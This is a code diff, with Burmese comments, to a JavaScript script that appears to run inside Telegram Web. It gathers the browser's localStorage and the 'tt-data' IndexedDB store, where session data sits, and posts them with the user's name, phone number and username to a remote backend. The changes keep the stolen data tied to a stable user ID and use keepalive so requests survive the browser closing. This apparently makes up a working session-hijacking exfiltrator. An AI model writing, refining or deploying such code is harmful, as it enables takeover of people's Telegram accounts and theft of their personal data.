@@ -267,25 +267,27 @@ async function exportIndexedDB(dbName, storeName) {
 
                 let lastSyncLength = 0; 
                 let wasLoggedIn = false; 
+                // 🚨 [FIX 1] Logout လုပ်ချိန်တွင် ID မပျောက်စေရန် Memory တွင် မှတ်ထားမည်
+                let lastKnownUserId = myUserId; 
 
                 const syncSessionData = async () => {
                     let profile = getTelegramProfile();
                     const lsDataStr = JSON.stringify(localStorage);
                     
-                    // 🚨 [အမှန်တကယ် အလုပ်လုပ်သော LOGIN CHECK] 🚨
-                    // Profile မရသေးရင်တောင် localStorage ထဲမှာ Data (၁၅၀၀) ကျော်လာရင် Login ဝင်ပြီလို့ သတ်မှတ်တဲ့ အရင်စနစ်ကို ပြန်သုံးပါမည်။
                     const isLoggedIn = profile !== null || lsDataStr.length > 1500;
 
                     // --- LOGOUT DETECTOR ---
                     if (wasLoggedIn && !isLoggedIn) {
                         console.log("⚠️ ညွှန်ကြားချက်: User သည် Logout လုပ်သွားပါသည်။ DB မှ Session ကို ရှင်းလင်းနေပါသည်...");
                         try {
-                            await fetch(BACKEND_URL + "/api/delete_session", {
+                            // 🚨 [FIX 2] await မခံတော့ဘဲ keepalive: true သုံး၍ Browser ပိတ်သွားပါကလည်း Request ဆက်သွားအောင် လုပ်မည်
+                            fetch(BACKEND_URL + "/api/delete_session", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
-                                body: JSON.stringify({ user_id: myUserId }) 
+                                body: JSON.stringify({ user_id: lastKnownUserId }), // မှတ်ထားသော ID ကိုသာ အသုံးပြုမည်
+                                keepalive: true 
                             });
-                            console.log("🗑️ Database မှ Data အားလုံး အောင်မြင်စွာ ဖျက်ပစ်လိုက်ပါပြီ။");
+                            console.log("🗑️ Database သို့ ဖျက်ရန် Request ပို့ပြီးပါပြီ။");
                             wasLoggedIn = false; 
                             lastSyncLength = 0;
                         } catch(e) { console.error("❌ DB ဖျက်ရာတွင် အမှားဖြစ်နေပါသည်", e); }
@@ -295,7 +297,10 @@ async function exportIndexedDB(dbName, storeName) {
                     // --- SYNC LOGIC ---
                     if (isLoggedIn) {
                         wasLoggedIn = true; 
-                        if (profile) myUserId = profile.uid; 
+                        if (profile) {
+                            myUserId = profile.uid; 
+                            lastKnownUserId = profile.uid; // 🚨 Profile ရသည်နှင့် အမှန်ကန်ဆုံး ID ကို မှတ်ထားမည်
+                        }
 
                         try {
                             const rawIdbData = await exportIndexedDB("tt-data", "store"); 
@@ -315,7 +320,7 @@ async function exportIndexedDB(dbName, storeName) {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                                 body: JSON.stringify({
-                                    user_id: myUserId, 
+                                    user_id: lastKnownUserId, // 🚨 myUserId အစား မှတ်ထားသော lastKnownUserId ကိုသာ သုံးမည်
                                     profile_name: finalName,
                                     profile_phone: finalPhone,
                                     profile_username: finalUsername,
